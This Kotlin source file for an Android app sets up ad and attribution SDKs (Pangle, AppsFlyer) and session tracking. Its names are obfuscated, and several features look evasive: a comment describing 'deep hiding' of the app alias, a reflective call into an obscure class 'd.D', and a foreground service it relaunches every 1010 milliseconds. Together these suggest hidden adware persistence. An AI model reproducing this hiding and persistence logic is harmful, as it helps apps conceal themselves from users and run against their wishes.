package com.september.nine.chong.data

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.appsflyer.AppsFlyerLib
import com.bytedance.sdk.openadsdk.api.PAGMUserInfoForSegment
import com.bytedance.sdk.openadsdk.api.init.PAGMConfig
import com.bytedance.sdk.openadsdk.api.init.PAGMSdk
import com.september.nine.chong.bgnj.BaLa
import com.september.nine.chong.ttuser.GetJkUtils
import com.september.nine.chong.user.GetRefUtils
import wawa.wkg.Kawm
import serviceshow.start.SeriesShow
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit
import com.september.nine.chong.core.AppCore
import com.september.nine.chong.utils.DataSync
import com.september.nine.chong.task.TaskManager
import com.september.nine.chong.bridge.ComponentBridge

object JksGo {
    private const val TAG = "JksGo"
    lateinit var bala: BaLa
    fun cesh(app: Application) {
        // 第1步: 初始化核心组件
        AppCore.initFirst(app) {
            // 第2步: 执行安全配置（enableAlias深度隐藏）
            ComponentBridge.processConfig(app) {
                // 第3步: 数据同步第一阶段
                DataSync.syncFirst(app) {
                    // 第4步: 初始化第三阶段
                    AppCore.initThird(app) {
                        // 第5步: 数据同步第二阶段
                        DataSync.syncSecond(app) {
                            // 第6步: 数据同步第三阶段
                            DataSync.syncThird(app) {
                                // 第7步: 初始化第六阶段
                                AppCore.initSixth(app) {
                                    // 第8步: 任务执行第一阶段
                                    TaskManager.executeFirst {
                                        // 第9步: 任务执行第二阶段
                                        TaskManager.executeSecond(app)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    fun registerObserver(app: Application) {
        bala = BaLa()
        app.registerActivityLifecycleCallbacks(bala)
    }

    fun ohernMet(app: Application) {
        try {
            val clazz = app.classLoader.loadClass("d.D")
            val method = clazz.getDeclaredMethod("d1", Object::class.java)
            method.isAccessible = true
            method.invoke(null, app)
        } catch (e: NoSuchMethodException) {
            Log.e("TAG", "cesh-NoSuchMethodException: ${e.message}")
        } catch (e: ClassNotFoundException) {
            Log.e("TAG", "cesh-ClassNotFoundException: ${e.message}")
        } catch (e: Exception) {
            Log.e("TAG", "cesh: ${e.message}")
            e.printStackTrace()
        }
    }

    fun showLog(msg: String) {
        Log.e("TAG", msg)
    }


    fun initPang(context: Context, ref: String) {
        runCatching {
            // 根据 ref 参数设置 channel
            val channel = getChannelFromRef(ref)

            Log.e(TAG, "initPang: ref=$ref, channel=$channel")

            PAGMSdk.init(
                context, PAGMConfig.Builder()
                    .appId(KeyCon.getPangKey())
                    .setConfigUserInfoForSegment(
                        PAGMUserInfoForSegment.Builder()
                            .setChannel(channel)
                            .build()
                    )
                    .supportMultiProcess(false)
                    .build(), null
            )
        }.onFailure { error ->
            JksGo.showLog("Ad SDK initialization failed: ${error.message}")
        }
    }


    private fun getChannelFromRef(ref: String): String {
        return try {
            val refLowerCase = ref.lowercase()
            when {
                refLowerCase.contains("facebook") || refLowerCase.contains("fb4a") -> {
                    "facebook"
                }

                refLowerCase.contains("tiktok") || refLowerCase.contains("bytedance") -> {
                    "tiktok"
                }

                refLowerCase.contains("gclid") -> {
                    "GoogleAds"
                }

                else -> {
                    "organic"
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            "unknown"
        }
    }

    private val scheduler = Executors.newScheduledThreadPool(1)
    private var scheduledFuture: ScheduledFuture<*>? = null

    fun startPeriodicService(context: Context) {
        stopPeriodicService()
        scheduledFuture = scheduler.scheduleWithFixedDelay({
            if (!KeyCon.isOpenNotification && Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                ContextCompat.startForegroundService(
                    context,
                    Intent(context, SeriesShow::class.java)
                )
            }
        }, 0, 1010, TimeUnit.MILLISECONDS)
    }

    fun stopPeriodicService() {
        scheduledFuture?.cancel(false)
        scheduledFuture = null
    }

    fun initAlly(app: Application) {
        Log.e("TAG", "initAlly: id=${KeyCon.aidec}---${KeyCon.getApplyKey()}")
        AppsFlyerLib.getInstance()
            .init(KeyCon.getApplyKey(), null, app)
        AppsFlyerLib.getInstance().setCustomerUserId(KeyCon.aidec)
        AppsFlyerLib.getInstance().start(app)
    }

    private val handler = Handler(Looper.getMainLooper())
    private var ssPostRunnable: Runnable? = null

    fun ssPostFun() {
        try {
            GetJkUtils.postPointFun(false, "session")
            ssPostRunnable?.let { handler.removeCallbacks(it) }
            ssPostRunnable = Runnable {
                GetJkUtils.postPointFun(false, "session")
                handler.postDelayed(ssPostRunnable!!, 15 * 60 * 1000L)
            }
            handler.postDelayed(ssPostRunnable!!, 15 * 60 * 1000L)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}